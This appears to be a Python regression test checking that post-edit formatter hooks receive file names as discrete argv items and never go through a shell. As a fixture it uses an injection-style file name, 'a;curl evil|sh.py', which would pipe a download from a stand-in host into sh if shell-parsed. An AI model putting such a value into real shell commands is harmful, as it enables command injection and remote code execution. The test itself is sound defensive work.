"""Regression: post-edit hooks must execute as argv lists, never a bash -c string.

A touched file named like ``a;curl evil|sh.py`` or ``my file.py`` must reach the
formatter/linter as a single discrete argument, not be re-parsed as shell syntax.
"""

from __future__ import annotations

import subprocess
from pathlib import Path

import atelier.core.capabilities.tool_supervision.post_edit_hooks as peh


def test_hook_runs_argv_list_without_shell(monkeypatch) -> None:
    captured: list[list[str]] = []

    class _FakeProc:
        returncode = 0
        stdout = ""

    def _fake_run(cmd, **kwargs):
        # Filenames must arrive as discrete argv elements, and never via a shell.
        assert isinstance(cmd, list)
        assert kwargs.get("shell") in (None, False)
        captured.append(cmd)
        return _FakeProc()

    monkeypatch.setattr(subprocess, "run", _fake_run)
    monkeypatch.setattr(peh, "_has", lambda tool: tool == "ruff")

    danger = "a;curl evil|sh.py"
    peh.run_post_edit_hooks([danger], repo_root=Path("/tmp"))

    assert captured, "expected at least one hook command to run"
    # The malicious filename survives intact as a single argument in every call.
    for cmd in captured:
        assert danger in cmd
